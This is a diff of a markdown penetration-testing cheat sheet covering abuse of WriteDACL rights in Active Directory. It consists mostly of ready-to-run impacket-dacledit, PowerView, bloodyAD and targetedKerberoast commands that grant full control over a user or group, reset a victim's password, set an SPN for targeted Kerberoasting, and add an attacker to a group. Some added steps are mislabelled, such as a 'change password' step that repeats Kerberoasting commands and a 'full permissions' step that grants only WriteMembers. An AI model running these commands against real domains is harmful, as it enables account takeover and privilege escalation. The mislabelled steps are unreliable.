@@ -59,42 +59,69 @@ Become the owner of an object → modify DACL to give themselves GenericAll.
    Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All
    ```
 ---
-## **WriteDACL**
-### Description: Permission to modify the DACL itself.
-### Exploit:
-The WriteDacl permission in Active Directory allows users to modify the **Discretionary Access Control List** (**DACL**) of an AD object, giving them the ability to control **object-level** permissions. Consequently, an attacker can write a new **Access Control Entry** (**ACE**) to the target object’s DACL, potentially gaining full control over the target object.
-### Tool Example: Add-DomainObjectAcl, PowerView, impacket-dacledit
-1. **`impacket-dacledit`**
-    ```bash
-    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'myuser' -target-dn 'CN=target,CN=Users,DC=domain,DC=local' 'domain.local'/'myuser':'myPassword@1' -dc-ip 192.168.1.3
-    ```
-    after this we can reset that user password or do targeted kerberoasting using `targetedkerberoast`
-    - Targeted Kerberoasting 
-        ```bash
-        targetedKerberoast.py --dc-ip '192.168.1.3' -v -d 'domain.local' -u 'myuser' -p 'myPassword@1'
-        ```
-    - Change Password   
-        ```bash
-        bloodyAD --host "192.168.1.3" -d "domain.local" -u "myuser" -p "Password@1" set password "targer" "newPassword@789"
-        ```
-2. **`PowerView`**
-        ```powershell
-        powershell -ep bypass
-        Import-Module .PowerView.ps1
-        Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_usr" -PrincipalIdentity "myuser"
-        ```
-    - After this we can do kerberoasting / change password
-        ```powershell
-        Set-DomainObject -Identity 'target_usr' -Set @{serviceprincipalname='nonexistent/hacking'}
-        Get-DomainUser 'target_usr' | Select serviceprincipalname
-        $User = Get-DomainUser 'target_usr'
-        $User | Get-DomainSPNTicket
-        ```
-    - Change password
-        ```powershell
-        $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
-        Set-DomainUserPassword -Identity 'target_us' -AccountPassword $NewPassword
-        ``
+## WriteDacl
+>**Description**: When an object has WriteDACL on another object, he can add ACEs to this object like adding permissions and granting All rights on him.
+
+### **Exploitation**
+
+#### `User` has `WriteDacl` on another `User`
+1.  Granting Full permissions over the user
+	- Linux `impacket-dacledit`
+		```bash
+		impacket-dacledit -action 'write' -rights 'FullControl' -principal 'myuser' -target-dn 'CN=targetuser,CN=Users,DC=ignite,DC=local' 'domain.local'/'myuser':'myPassword@1' -dc-ip 192.168.1.3
+		```
+	-  Windows `PowerView`
+		```powershell
+		powershell -ep bypass
+		Import-Module .PowerView.ps1
+		Add-DomainObjectAcl -Rights 'All' -TargetIdentity "targetuser" -PrincipalIdentity "myuser"
+		```
+2. **We can now `change password` / `targeted kerberoasting`**
+	1. Change password
+		- Linux `bloodyAD`
+			```bash
+			bloodyAD --host "192.168.1.3" -d "domain.local" -u "myuser" -p "myPassword@1" set password "targetuser" "newPassword@789"
+			```
+		- Windows `PowerView`
+			```powershell
+			Set-DomainObject -Identity 'aarti' -Set @{serviceprincipalname='nonexistent/hacking'}
+			Get-DomainUser 'aarti' | Select serviceprincipalname
+			$User = Get-DomainUser 'aarti'
+			$User | Get-DomainSPNTicket
+			```
+	2. Targeted Kerberoasting
+		- Linux `targetedKerberoast.py`
+			```bash
+			targetedKerberoast.py --dc-ip '192.168.1.3' -v -d 'domain.local' -u 'myuser' -p 'myPassword@1'
+			```
+		-  Windows `PowerView`
+			```powershell
+			Set-DomainObject -Identity 'aarti' -Set @{serviceprincipalname='nonexistent/hacking'}
+			Get-DomainUser 'aarti' | Select serviceprincipalname
+			$User = Get-DomainUser 'aarti'
+			$User | Get-DomainSPNTicket
+			```
+#### `User` has `WriteDacl` on another `Group`
+1. Granting Full Permissions over the target group
+	1. Linux `impacket-dacledit`
+		```bash
+		impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'myuser' -target-dn 'CN=Target Group,CN=Users,DC=ignite,DC=local' 'domain.local'/'mysuer':'myPassword@1' -dc-ip 192.168.1.3
+		```
+	2. Windows `PowerView`
+		```powershell
+		powershell -ep bypass
+		Import-Module .PowerView.ps1
+		Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Target Group" -PrincipalIdentity "myuser"
+		```
+2. Adding a member to this group so we grant/ inherit that group permissions
+	1. Linux `bloodyAD`
+	  ```bash
+	   bloodyAD --host "192.168.1.3" -d "domain.local" -u "myuser" -p "myPassword@1" add groupMember "Target Group" "myuser" #we can any user we have control on
+	   ```
+	2. Windows `PowerView`
+		```bash
+		net group "Target Group" myuser /add /domain
+		```
 ---
 ## **Self-Membership / Add Member to Group**
 ### Description: If an attacker has WriteProperty on a group object.
